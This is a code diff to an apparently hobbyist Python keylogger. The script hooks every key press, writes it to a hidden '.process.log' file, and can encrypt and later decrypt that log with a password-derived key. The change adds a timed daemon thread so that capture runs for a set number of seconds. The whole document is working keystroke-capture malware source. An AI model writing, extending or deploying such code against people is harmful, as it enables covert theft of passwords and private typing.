@@ -1,7 +1,7 @@
 import keyboard
 import argparse
 import time
-import os
+from threading import Thread
 import base64
 from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives import hashes
@@ -20,31 +20,42 @@ parser.add_argument("-d", "--decrypt", help="takes in a string that's used to de
 
 args = parser.parse_args()
 f = args.format
-seconds = args.time
+max_seconds = args.time
 enc_key = args.encrypt
 dec_key = args.decrypt
 
 log_file = ".process.log"
 
-if dec_key == None:
-    print("Capturing strokes...")
-    # w mode so log file is overwritten on run
-    open(log_file, "w").close()
+def main():
+    if dec_key == None:
+        print("Capturing strokes...")
+        # w mode so log file is overwritten on run
+        open(log_file, "w").close()
 
-    def press_key(event):
-        with open(log_file, "a") as file:
-            if f:
-                # Each key press on new line
-                file.write("{}\n".format(event.name))
-            else:
-                # All key presses on same line
-                file.write(event.name)
+        def press_key(event):
+            with open(log_file, "a") as file:
+                if f:
+                    # Each key press on new line
+                    file.write("{}\n".format(event.name))
+                else:
+                    # All key presses on same line
+                    file.write(event.name)
 
-    keyboard.on_press(press_key)
+        keyboard.on_press(press_key)
 
-    # If hashtag is pressed then program will quit
-    keyboard.wait("#")
+        # If hashtag is pressed then program will quit
+        keyboard.wait("#")
 
+if max_seconds != None:
+    # main func is a daemon thread and will end if max_seconds is reached
+    t = Thread(target=main)
+    t.daemon = True
+    t.start()
+    time.sleep(max_seconds)
+else:
+    main()
+
+# Encryption
 if enc_key != None and dec_key == None:
     bytes = str.encode(enc_key)
     kdf = PBKDF2HMAC(
@@ -66,7 +77,8 @@ if enc_key != None and dec_key == None:
 
     print("- Log file has been encrypted -")
 
-if (dec_key != None and enc_key == None) and (f == False and seconds == None):
+# Decryption
+if (dec_key != None and enc_key == None) and (f == False and max_seconds == None):
     bytes = str.encode(dec_key)
     kdf = PBKDF2HMAC(
         algorithm=hashes.SHA256(),
@@ -90,6 +102,5 @@ if (dec_key != None and enc_key == None) and (f == False and seconds == None):
         dec_file.write(decrypted)
 
     print("- Log file has been decrypted -")
-
 elif dec_key != None:
     print("Error: Only a singular argument may be parsed when decrypting, no flags other than -d should be inputted.")
